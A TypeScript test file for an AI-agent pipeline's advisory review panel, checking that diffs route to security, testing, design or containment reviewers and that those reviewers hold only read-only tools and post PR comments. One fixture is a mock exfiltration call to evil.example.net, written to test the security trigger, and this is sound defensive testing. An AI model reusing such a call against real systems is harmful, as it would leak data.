import assert from "node:assert/strict";
import { test } from "node:test";
import {
  anySpecialistConcern,
  buildSpecialistCommentArgs,
  buildSpecialistSpawnArgs,
  containmentTrigger,
  designTrigger,
  isReadOnlyToolset,
  parseSpecialistVerdict,
  renderSpecialistPanelComment,
  routeSpecialists,
  securityTrigger,
  SPECIALIST_TOOLS,
  testingTrigger,
  type SpecialistName,
  type SpecialistPanelInput,
} from "../src/lib/specialist-panel.js";
import type { DiffSummary } from "../src/lib/risk-score.js";
import type { Mount } from "../src/lib/mounts.js";

function diffOf(...files: { path: string; content?: string }[]): DiffSummary {
  return { files: files.map((f) => ({ path: f.path, additions: 1, deletions: 0, content: f.content })) };
}

const MOUNT: Mount = { model: "sonnet", effort: "medium", maxTurns: 20, contextBudget: 100_000 };

// ── Acceptance criterion 1: egress to a new domain -> security, NOT design ──

test("routeSpecialists: a diff adding a network call to a new domain triggers security and NOT design", () => {
  const diff = diffOf({
    path: "src/lib/vendor-client.ts",
    content: `export async function ping() { return fetch("https://api.new-vendor.example.com/v1/ping"); }`,
  });
  const triggers = routeSpecialists({ diff });
  const names = triggers.map((t) => t.specialist);
  assert.ok(names.includes("security"), `expected security in ${JSON.stringify(names)}`);
  assert.ok(!names.includes("design"), `expected design NOT triggered, got ${JSON.stringify(names)}`);
  assert.ok(!names.includes("testing"));
  assert.ok(!names.includes("containment"));
});

test("securityTrigger: fires directly on a raw network-call diff", () => {
  const diff = diffOf({ path: "src/lib/x.ts", content: `axios.get("https://evil.example.net/exfil")` });
  const trigger = securityTrigger(diff);
  assert.equal(trigger?.specialist, "security");
});

// ── Acceptance criterion 2: docs-only diff -> zero specialists ─────────────

test("routeSpecialists: a docs-only diff triggers NO specialist", () => {
  const diff = diffOf({ path: "docs/guide.md", content: "# Guide\n\nSome prose about the feature." });
  const triggers = routeSpecialists({ diff });
  assert.deepEqual(triggers, []);
});

test("routeSpecialists: a docs-only diff with a critical risk band still routes to containment ONLY (backstop, not a false security/testing/design fire)", () => {
  const diff = diffOf({ path: "docs/guide.md" });
  const triggers = routeSpecialists({ diff, riskBand: "critical" });
  assert.deepEqual(
    triggers.map((t) => t.specialist),
    ["containment"],
  );
});

// ── The four specialist triggers, individually ─────────────────────────────

test("containmentTrigger: fires on hooks/, settings, sandbox, and .env paths", () => {
  assert.equal(containmentTrigger(diffOf({ path: "hooks/deny-floor.sh" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: ".claude/settings.json" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: "settings/worker.json" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: ".env.production" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: "src/lib/sandbox-probe.ts" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: "README.md" })), null);
});

test("containmentTrigger: a critical risk band is a BACKSTOP even with no matching path (FIELD FINDING 10a)", () => {
  const trigger = containmentTrigger(diffOf({ path: "src/lib/unrelated.ts" }), "critical");
  assert.equal(trigger?.specialist, "containment");
  assert.match(trigger!.reason, /backstop/i);
});

test("containmentTrigger: a non-critical risk band is NOT a backstop", () => {
  assert.equal(containmentTrigger(diffOf({ path: "src/lib/unrelated.ts" }), "high"), null);
  assert.equal(containmentTrigger(diffOf({ path: "src/lib/unrelated.ts" }), "low"), null);
});

test("testingTrigger: fires on tdd:strict, negative coverage/mutation delta, or new untested paths", () => {
  assert.equal(testingTrigger(undefined), null);
  assert.equal(testingTrigger({})?.specialist ?? null, null);
  assert.equal(testingTrigger({ tddStrict: true })?.specialist, "testing");
  assert.equal(testingTrigger({ coverageDelta: -1 })?.specialist, "testing");
  assert.equal(testingTrigger({ coverageDelta: 1 }), null);
  assert.equal(testingTrigger({ mutationDelta: -0.5 })?.specialist, "testing");
  assert.equal(testingTrigger({ newCodePathsWithoutTests: true })?.specialist, "testing");
});

test("designTrigger: fires on task-declared layer-crossing or new abstraction, never diff-derived", () => {
  assert.equal(designTrigger(undefined), null);
  assert.equal(designTrigger({})?.specialist ?? null, null);
  assert.equal(designTrigger({ crossesLayerBoundary: true })?.specialist, "design");
  assert.equal(designTrigger({ addsAbstraction: true })?.specialist, "design");
});

test("routeSpecialists: order is fixed (security, testing, design, containment) and multiple triggers can co-fire", () => {
  const input: SpecialistPanelInput = {
    diff: diffOf({ path: "hooks/deny-floor.sh" }, { path: "package.json" }),
    task: { tddStrict: true, crossesLayerBoundary: true },
  };
  const triggers = routeSpecialists(input);
  assert.deepEqual(
    triggers.map((t) => t.specialist),
    ["security", "testing", "design", "containment"],
  );
});

test("routeSpecialists: deterministic — the same input always yields the same set", () => {
  const input: SpecialistPanelInput = { diff: diffOf({ path: "package-lock.json" }) };
  const a = routeSpecialists(input);
  const b = routeSpecialists(input);
  assert.deepEqual(a, b);
});

// ── Acceptance criterion 3: specialists are read-only and only advise ─────

test("SPECIALIST_TOOLS carries no write-capable tool", () => {
  assert.ok(isReadOnlyToolset(SPECIALIST_TOOLS));
  for (const write of ["Write", "Edit", "NotebookEdit", "MultiEdit"]) {
    assert.ok(!SPECIALIST_TOOLS.includes(write), `SPECIALIST_TOOLS must not include ${write}`);
  }
});

test("isReadOnlyToolset: false the moment any write tool is present", () => {
  assert.equal(isReadOnlyToolset(["Read", "Grep"]), true);
  assert.equal(isReadOnlyToolset(["Read", "Write"]), false);
  assert.equal(isReadOnlyToolset(["Bash", "Edit"]), false);
});

test("buildSpecialistSpawnArgs: every specialist's real spawn carries ONLY the read-only tool list", () => {
  const specialists: SpecialistName[] = ["security", "testing", "design", "containment"];
  for (const specialist of specialists) {
    const args = buildSpecialistSpawnArgs({
      input: { specialist, taskId: "W2-T1", prUrl: "https://github.com/x/y/pull/1", triggers: [] },
      mount: MOUNT,
      cwd: "/tmp/whatever",
      settingsFile: "/tmp/settings.json",
    });
    assert.deepEqual(args.tools, SPECIALIST_TOOLS);
    assert.ok(isReadOnlyToolset(args.tools ?? []));
  }
});

test("buildSpecialistCommentArgs: posts a PR COMMENT, never a commit status/merge call", () => {
  const args = buildSpecialistCommentArgs("https://github.com/x/y/pull/1", "looks fine");
  assert.deepEqual(args, ["pr", "comment", "https://github.com/x/y/pull/1", "--body", "looks fine"]);
  assert.ok(!args.includes("api"));
  assert.ok(!args.some((a) => /status/i.test(a)));
  assert.ok(!args.some((a) => /merge/i.test(a)));
});

test("parseSpecialistVerdict: parses PASS/CONCERN + comments; unparseable output fails SAFE to pass (advisory, never a stall)", () => {
  const concern = parseSpecialistVerdict(
    "security",
    "SPECIALIST_VERDICT: CONCERN\nSPECIALIST_COMMENT: new egress to an unreviewed domain\n",
  );
  assert.equal(concern.state, "concern");
  assert.deepEqual(concern.comments, ["new egress to an unreviewed domain"]);

  const pass = parseSpecialistVerdict("testing", "SPECIALIST_VERDICT: PASS\n");
  assert.equal(pass.state, "pass");
  assert.deepEqual(pass.comments, []);

  const garbled = parseSpecialistVerdict("design", "the model rambled and emitted nothing parseable");
  assert.equal(garbled.state, "pass");
  assert.deepEqual(garbled.comments, []);
});

test("anySpecialistConcern / renderSpecialistPanelComment fold verdicts without deciding anything (advisory only)", () => {
  const verdicts = [
    { specialist: "security" as const, state: "pass" as const, comments: [] },
    { specialist: "containment" as const, state: "concern" as const, comments: ["settings typo risk"] },
  ];
  assert.equal(anySpecialistConcern(verdicts), true);
  assert.equal(anySpecialistConcern([{ specialist: "design", state: "pass", comments: [] }]), false);

  const rendered = renderSpecialistPanelComment(verdicts);
  assert.match(rendered, /security.*PASS/i);
  assert.match(rendered, /containment.*CONCERN/i);
  assert.match(rendered, /settings typo risk/);
});
